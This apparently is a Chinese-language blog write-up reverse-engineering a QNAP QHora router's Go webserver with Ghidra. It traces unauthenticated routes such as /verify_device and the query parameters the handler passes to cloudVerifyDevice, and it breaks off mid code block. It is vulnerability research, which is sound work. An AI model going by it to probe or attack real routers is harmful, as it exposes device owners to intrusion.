<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* WARNING: Unknown calling convention */</span></span><br><span class="line"><span class="comment">/* Name: miro-webserver/routes/qhora_301w.regV1NonAuthAPIs</span></span><br><span class="line"><span class="comment">   Start: 00d5e420</span></span><br><span class="line"><span class="comment">   End: 00d5e6c0 */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> miro-webserver/routes/qhora_301w.regV1NonAuthAPIs(undefined8 param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  code **ppcVar1;</span><br><span class="line">  <span class="type">long</span> unaff_x28;</span><br><span class="line">  code **in_stack_ffffffffffffffa0;</span><br><span class="line">  <span class="type">char</span> *pcVar2;</span><br><span class="line">  <span class="type">char</span> *pcVar3;</span><br><span class="line">  undefined8 in_stack_ffffffffffffffd8;</span><br><span class="line">  undefined8 in_stack_ffffffffffffffe0;</span><br><span class="line">  </span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/routes/qhora_301w/index.go:162</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  <span class="keyword">while</span> (&amp;stack0x00000000 &lt;= *(undefined **)(unaff_x28 + <span class="number">0x10</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/routes/qhora_301w/index.go:162</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">    runtime.morestack_noctxt();</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/routes/qhora_301w/index.go:163</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  runtime.newobject(&amp;DAT_00eda840,in_stack_ffffffffffffffa0);</span><br><span class="line">  *in_stack_ffffffffffffffa0 = github.com/appleboy/gin-jwt/v2.(*GinJWTMiddleware).LoginHandler-fm;</span><br><span class="line">  ppcVar1 = in_stack_ffffffffffffffa0;</span><br><span class="line">  <span class="keyword">if</span> (DAT_01830e10 == <span class="number">0</span>) &#123;</span><br><span class="line">    in_stack_ffffffffffffffa0[<span class="number">1</span>] = DAT_017fa300;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    runtime.gcWriteBarrier();</span><br><span class="line">  &#125;</span><br><span class="line">  runtime.newobject(&amp;datatype.Array.[<span class="number">1</span>]gin.HandlerFunc,ppcVar1);</span><br><span class="line">  <span class="keyword">if</span> (DAT_01830e10 == <span class="number">0</span>) &#123;</span><br><span class="line">    *ppcVar1 = (code *)in_stack_ffffffffffffffa0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    runtime.gcWriteBarrier();</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/gin-gonic/gin/routergroup.go:98</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  pcVar2 = s_POST_00fa5b10;</span><br><span class="line">  github.com/gin-gonic/gin.(*RouterGroup).handle</span><br><span class="line">            (param_1,s_POST_00fa5b10,<span class="number">4</span>,&amp;DAT_00fa759b,<span class="number">6</span>,ppcVar1,<span class="number">1</span>,<span class="number">1</span>,in_stack_ffffffffffffffd8,</span><br><span class="line">             in_stack_ffffffffffffffe0);</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/routes/qhora_301w/index.go:164</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  runtime.newobject(&amp;DAT_00eda840,pcVar2);</span><br><span class="line">  *(code **)pcVar2 = github.com/appleboy/gin-jwt/v2.(*GinJWTMiddleware).LoginHandler-fm;</span><br><span class="line">  ppcVar1 = (code **)pcVar2;</span><br><span class="line">  <span class="keyword">if</span> (DAT_01830e10 == <span class="number">0</span>) &#123;</span><br><span class="line">    *(code **)((<span class="type">long</span>)pcVar2 + <span class="number">8</span>) = DAT_017fa308;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    runtime.gcWriteBarrier();</span><br><span class="line">  &#125;</span><br><span class="line">  runtime.newobject(&amp;datatype.Array.[<span class="number">1</span>]gin.HandlerFunc,ppcVar1);</span><br><span class="line">  <span class="keyword">if</span> (DAT_01830e10 == <span class="number">0</span>) &#123;</span><br><span class="line">    *ppcVar1 = (code *)pcVar2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    runtime.gcWriteBarrier();</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/gin-gonic/gin/routergroup.go:98</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  pcVar2 = s_POST_00fa5b10;</span><br><span class="line">  github.com/gin-gonic/gin.(*RouterGroup).handle</span><br><span class="line">            (param_1,<span class="string">&quot;POST&quot;</span>,<span class="number">4</span>,<span class="string">&quot;/initial/login&quot;</span>,<span class="number">0xe</span>,ppcVar1,<span class="number">1</span>,<span class="number">1</span>,in_stack_ffffffffffffffd8,</span><br><span class="line">             in_stack_ffffffffffffffe0);</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/routes/qhora_301w/index.go:165</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  runtime.newobject(&amp;datatype.Array.[<span class="number">1</span>]gin.HandlerFunc,pcVar2);</span><br><span class="line">  *(undefined ***)pcVar2 = &amp;PTR_miro-webserver/controllers/api/system.VerifyDeviceAPI_0102f708; <span class="comment">//[2]</span></span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/gin-gonic/gin/routergroup.go:103</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  pcVar3 = s_GET_00fa5267;</span><br><span class="line">  github.com/gin-gonic/gin.(*RouterGroup).handle</span><br><span class="line">            (param_1,<span class="string">&quot;GET&quot;</span>,<span class="number">3</span>,<span class="string">&quot;/verify_device&quot;</span>,<span class="number">0xe</span>,pcVar2,<span class="number">1</span>,<span class="number">1</span>,in_stack_ffffffffffffffd8,</span><br><span class="line">             in_stack_ffffffffffffffe0); <span class="comment">//[1]</span></span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/routes/qhora_301w/index.go:167</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  runtime.newobject(&amp;datatype.Array.[<span class="number">1</span>]gin.HandlerFunc,pcVar3);</span><br><span class="line">  *(undefined ***)pcVar3 = &amp;PTR_miro-webserver/controllers/api/system.GetMachineInfoAPI_0102f668;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/gin-gonic/gin/routergroup.go:103</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  github.com/gin-gonic/gin.(*RouterGroup).handle</span><br><span class="line">            (param_1,<span class="string">&quot;GET&quot;</span>,<span class="number">3</span>,<span class="string">&quot;/machine_info&quot;</span>,<span class="number">0xd</span>,pcVar3,<span class="number">1</span>,<span class="number">1</span>,in_stack_ffffffffffffffd8,</span><br><span class="line">             in_stack_ffffffffffffffe0);</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/routes/qhora_301w/index.go:168</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>在[1]处设置了路由, 而[2]处就是我们调用的函数<code>miro-webserver/controllers/api/system.VerifyDeviceAPI</code>, 进入这个函数.</p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> miro-webserver/controllers/api/system.VerifyDeviceAPI(undefined8 param_1)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined8 uVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  <span class="type">long</span> lVar3;</span><br><span class="line">  <span class="type">char</span> cVar4;</span><br><span class="line">  undefined8 *puVar5;</span><br><span class="line">  <span class="type">long</span> unaff_x28;</span><br><span class="line">  undefined *unaff_x29;</span><br><span class="line">  undefined8 unaff_x30;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/system/hora_system.go:770</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">    puVar5 = (undefined8 *)register0x00000008;</span><br><span class="line">    <span class="keyword">if</span> (*(undefined **)(unaff_x28 + <span class="number">0x10</span>) &lt; (undefined *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0xc0</span>)) &#123;</span><br><span class="line">      puVar5 = (undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x140</span>);</span><br><span class="line">                    <span class="comment">/* not_found:77276 */</span></span><br><span class="line">      *puVar5 = unaff_x30;</span><br><span class="line">                    <span class="comment">/* not_found:77277 */</span></span><br><span class="line">      *(undefined **)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x148</span>) = unaff_x29;</span><br><span class="line">                    <span class="comment">/* not_found:77280 */</span></span><br><span class="line">      unaff_x29 = (undefined *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x148</span>);</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/system/hora_system.go:771</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x80</span>) = <span class="number">0</span>;</span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x78</span>) = <span class="number">0</span>;</span><br><span class="line">      *(runtime._type **)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x80</span>) = &amp;datatype.String.<span class="built_in">string</span>;</span><br><span class="line">      *(undefined ***)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x78</span>) = &amp;goss_QidRequest_116aa70;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/sirupsen/logrus/logger.go:206</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x138</span>) = DAT_017fa440;</span><br><span class="line">      *(undefined4 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x130</span>) = <span class="number">4</span>;</span><br><span class="line">      *(undefined **)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x128</span>) =</span><br><span class="line">           (undefined *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x80</span>);</span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x120</span>) = <span class="number">1</span>;</span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x118</span>) = <span class="number">1</span>;</span><br><span class="line">      github.com/sirupsen/logrus.(*Logger).Log</span><br><span class="line">                (*(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x138</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x130</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x128</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x120</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x118</span>));</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/gin-gonic/gin/context.go:381</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x138</span>) =</span><br><span class="line">           *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">8</span>);</span><br><span class="line">      *(undefined **)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x130</span>) = <span class="string">&quot;verify_device&quot;</span>;</span><br><span class="line">      *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x128</span>) = <span class="number">0xd</span>;</span><br><span class="line">      github.com/gin-gonic/gin.(*Context).GetQueryArray <span class="comment">//[1]</span></span><br><span class="line">                (*(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x138</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x130</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x128</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x120</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x118</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x110</span>),</span><br><span class="line">                 *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x108</span>));</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/gin-gonic/gin/context.go:382</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/gin-gonic/gin/context.go:381</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">      <span class="keyword">if</span> (*(<span class="type">char</span> *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x108</span>) == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">        uVar1 = <span class="number">0</span>;</span><br><span class="line">        uVar2 = <span class="number">0</span>;</span><br><span class="line">LAB_00bf1d7c:</span><br><span class="line">        *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0xe0</span>) = uVar2;</span><br><span class="line">        *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0xe8</span>) = uVar1;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/gin-gonic/gin/context.go:381</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">        *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x138</span>) =</span><br><span class="line">             *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">8</span>);</span><br><span class="line">        *(undefined **)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x130</span>) = <span class="string">&quot;device_token&quot;</span>;</span><br><span class="line">        *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x128</span>) = <span class="number">0xc</span>;</span><br><span class="line">        github.com/gin-gonic/gin.(*Context).GetQueryArray <span class="comment">//[2]</span></span><br><span class="line">                  (*(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x138</span>),</span><br><span class="line">                   *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x130</span>),</span><br><span class="line">                   *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x128</span>),</span><br><span class="line">                   *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x120</span>),</span><br><span class="line">                   *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x118</span>),</span><br><span class="line">                   *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x110</span>),</span><br><span class="line">                   *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x108</span>));</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/gin-gonic/gin/context.go:382</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/gin-gonic/gin/context.go:381</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">        cVar4 = *(<span class="type">char</span> *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x108</span>);</span><br><span class="line">        <span class="keyword">if</span> (cVar4 == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">          uVar1 = <span class="number">0</span>;</span><br><span class="line">          uVar2 = <span class="number">0</span>;</span><br><span class="line">          cVar4 = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">LAB_00bf1dd4:</span><br><span class="line">          *(<span class="type">char</span> *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0xfa</span>) = cVar4;</span><br><span class="line">          *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0xf0</span>) = uVar1;</span><br><span class="line">          *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0xd0</span>) = uVar2;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/gin-gonic/gin/context.go:381</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">          *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x138</span>) =</span><br><span class="line">               *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">8</span>);</span><br><span class="line">          *(undefined **)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x130</span>) = <span class="string">&quot;callback&quot;</span>;</span><br><span class="line">          *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x128</span>) = <span class="number">8</span>;</span><br><span class="line">          github.com/gin-gonic/gin.(*Context).GetQueryArray <span class="comment">//[3]</span></span><br><span class="line">                    (*(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x138</span>),</span><br><span class="line">                     *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x130</span>),</span><br><span class="line">                     *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x128</span>),</span><br><span class="line">                     *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x120</span>),</span><br><span class="line">                     *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x118</span>),</span><br><span class="line">                     *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x110</span>),</span><br><span class="line">                     *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x108</span>));</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/gin-gonic/gin/context.go:382</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/vendor/github.com/gin-gonic/gin/context.go:381</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">          <span class="keyword">if</span> (*(<span class="type">char</span> *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x108</span>) == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">            uVar1 = <span class="number">0</span>;</span><br><span class="line">            uVar2 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">goto</span> LAB_00bf1e2c;</span><br><span class="line">               <span class="comment">// log print</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">              lVar3 = *(<span class="type">long</span> *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0xf8</span>);</span><br><span class="line">              <span class="keyword">if</span> (lVar3 != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">/* /root/build_qhora-322_2.4.1.634/build/go-gin-webframework-t_qurouter_2.4.1.63 4/miro-webserver/controllers/api/system/hora_system.go:784</span></span><br><span class="line"><span class="comment">                        */</span></span><br><span class="line">                *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x138</span>) =</span><br><span class="line">                     *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0xd0</span>);</span><br><span class="line">                *(<span class="type">long</span> *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x130</span>) =</span><br><span class="line">                     *(<span class="type">long</span> *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0xf0</span>);</span><br><span class="line">                miro-webserver/controllers/api/system.cloudVerifyDevice <span class="comment">//[4]</span></span><br><span class="line">                          (*(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x138</span>),</span><br><span class="line">                           *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x130</span>),</span><br><span class="line">                           *(undefined8 *)((<span class="type">long</span>)register0x00000008 + <span class="number">-0x128</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>我已经尽可能的删除代码和一些打印日志了,或者下面这个我自己写的一个简单的示例.</p>
</blockquote>
 <div class="code-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//简单的看一下代码，Ghidra太复杂了，自己写的简单概括一下</span></span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">func</span> <span class="title">VerifyDeviceAPI</span><span class="params">(c *gin.Context)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  verify_device, res := c.GetQueryArray(<span class="string">&quot;verify_device&quot;</span>)</span><br><span class="line">  device_token, res := c.GetQueryArray(<span class="string">&quot;device_token&quot;</span>)</span><br><span class="line">  callback, res := c.GetQueryArray(<span class="string">&quot;callback&quot;</span>)</span><br><span class="line"><span class="comment">//打印日志....</span></span><br><span class="line"></span><br><span class="line">  cloudVerifyDevice(device_token)</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>可以在[1],[2],[3]处使用<code>GetQueryArray</code>函数去接收了我们在URL中传入的参数, 并进入[4]处的<code>system.coludVerifyDevice</code></p>
</blockquote>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 